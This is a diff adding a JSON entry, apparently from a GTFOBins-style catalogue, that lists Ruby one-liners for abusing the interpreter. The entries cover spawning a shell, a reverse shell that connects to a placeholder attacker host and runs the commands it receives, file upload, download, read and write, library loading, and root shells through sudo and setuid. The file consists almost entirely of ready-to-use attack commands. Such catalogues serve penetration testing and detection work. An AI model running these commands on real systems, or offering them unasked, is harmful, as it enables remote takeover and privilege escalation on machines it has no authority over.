@@ -1,0 +1,52 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "ruby -e 'exec \"/bin/sh\"'"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"[host]\",\"[port]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.",
+        "code": "ruby -run -e httpd . -p [port]\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "ruby -e 'require \"open-uri\"; IO.copy_stream(open(\"[url]\"), \"[file]\")'\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "ruby -e 'File.open(\"[file]\", \"w+\") { |f| f.write(\"DATA\") }'"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "ruby -e 'puts File.read(\"[file]\")'"
+      }
+    ],
+    "library-load": [
+      {
+        "code": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo ruby -e 'exec \"/bin/sh\"'"
+      }
+    ],
+    "capabilities": [
+      {
+        "code": "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
+      }
+    ]
+  }
+}
